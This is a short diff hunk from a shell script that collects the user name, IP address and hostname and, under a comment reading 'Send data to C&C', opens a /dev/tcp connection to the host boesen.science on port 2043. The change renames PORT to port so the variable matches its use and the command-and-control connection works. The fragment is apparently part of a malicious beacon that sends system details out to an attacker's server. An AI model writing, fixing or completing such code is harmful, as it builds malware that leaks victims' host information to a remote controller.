@@ -26,7 +26,7 @@ hostname=$(hostname)
 info="$user $ip $hostname"
 
 server="boesen.science"
-PORT=2043
+port=2043
 
 # Send data to C&C
 exec 3<>/dev/tcp/$server/$port
